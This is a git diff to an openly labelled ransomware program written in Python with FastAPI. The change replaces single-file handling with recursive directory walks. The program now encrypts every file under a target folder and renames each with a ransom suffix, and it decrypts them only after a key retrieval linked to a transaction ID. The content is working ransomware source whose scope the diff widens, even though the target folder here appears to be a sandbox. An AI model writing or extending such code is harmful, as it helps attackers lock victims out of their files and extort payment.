@@ -9,6 +9,8 @@ from fastapi import FastAPI
 import uvicorn
 
 EXPLANATION_FILENAME = 'YOUR_FILES_ENCRYPTED.txt'
+ENCRYPTED_FILE_TAG = 'ransom_encrypted'
+DIRECTORY_TO_ENCRYPT = 'RANSOM'
 
 app = FastAPI()
 
@@ -58,7 +60,7 @@ async def encrypt_file(filepath):
     with open(filepath, 'w') as file:
         file.write(new_file_body)
 
-    os.rename(filepath, f'{filepath}.ransom_encrypted')
+    os.rename(filepath, f'{filepath}.{ENCRYPTED_FILE_TAG}')
 
     print(f'File encryption successfull - {filepath}')
 
@@ -85,7 +87,12 @@ async def decrypt_file(filepath):
 
 
 async def encrypt_files():
-    await encrypt_file('RANSOM/ransom.txt')
+    # iterate recursively
+    for subdir, dirs, files in os.walk(DIRECTORY_TO_ENCRYPT):
+        for file in files:
+            filepath = os.path.join(subdir, file)
+            if file.split('.')[-1] != ENCRYPTED_FILE_TAG: # if already encrypted skip
+                await encrypt_file(filepath)
 
 async def decrypt_files(transaction_id):
     encrypted_fernet_key = rsa_cipher.get_encrypted_fernet_key()
@@ -101,7 +108,12 @@ async def decrypt_files(transaction_id):
 
     rsa_cipher.init_decryptor(fernet_key.encode('ascii'))
 
-    await decrypt_file('RANSOM/ransom.txt.ransom_encrypted')
+    # iterate recursively
+    for subdir, dirs, files in os.walk(DIRECTORY_TO_ENCRYPT):
+        for file in files:
+            filepath = os.path.join(subdir, file)
+            if file.split('.')[-1] == ENCRYPTED_FILE_TAG: # if encrypted
+                await decrypt_file(filepath)
 
     return 'Successfully decrypted files. If you want to use service again please run the ransomware again :)'
 
